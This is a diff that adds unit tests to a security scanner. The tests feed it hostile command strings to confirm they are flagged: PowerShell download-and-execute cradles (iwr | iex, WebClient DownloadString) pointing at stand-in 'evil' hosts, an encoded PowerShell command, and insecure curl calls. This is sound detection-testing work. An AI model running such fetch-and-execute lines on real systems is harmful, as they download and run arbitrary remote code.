@@ -74,6 +74,47 @@ def test_tls_disabled_is_medium():
     assert "tls-disabled" in labels("requests.get(url, verify=False)")
 
 
+def test_tls_disabled_catches_flag_first():
+    # The flag can precede the URL: curl -k URL and curl --insecure URL.
+    assert "tls-disabled" in labels("curl -k https://evil.example.com")
+    assert "tls-disabled" in labels("curl --insecure https://evil.example.com")
+
+
+# --- PowerShell attack patterns (Windows equivalent of curl|bash) --------
+def test_powershell_download_cradle_is_high():
+    assert "ps-download-cradle" in labels("iwr http://evil/x.ps1 | iex")
+    assert "ps-download-cradle" in labels(
+        "Invoke-WebRequest http://e/x | Invoke-Expression"
+    )
+
+
+def test_powershell_webclient_is_high():
+    assert "ps-webclient" in labels(
+        "(New-Object Net.WebClient).DownloadString('http://evil/x')"
+    )
+
+
+def test_powershell_encoded_command_is_high():
+    assert "ps-encoded-command" in labels(
+        "powershell -enc SQBFAFgAKABpAHcAcgB5ACkA"
+    )
+
+
+def test_powershell_executionpolicy_is_not_flagged():
+    # Our own register-scheduled-tasks.ps1 uses this — must NOT false-positive.
+    findings = sa.scan("powershell -ExecutionPolicy Bypass -File scripts/x.ps1")
+    assert "ps-encoded-command" not in {f["label"] for f in findings}
+
+
+def test_dynamic_code_exec_is_medium():
+    assert "dynamic-code-exec" in labels("eval(user_input)")
+    assert "dynamic-code-exec" in labels("exec(payload)")
+
+
+def test_dynamic_code_exec_ignores_the_word_execute():
+    assert "dynamic-code-exec" not in labels("execute(query) runs a SQL statement")
+
+
 # --- hidden content ------------------------------------------------------
 def test_zero_width_char_is_high():
     assert "zero-width-chars" in labels("normal text ​ hidden")
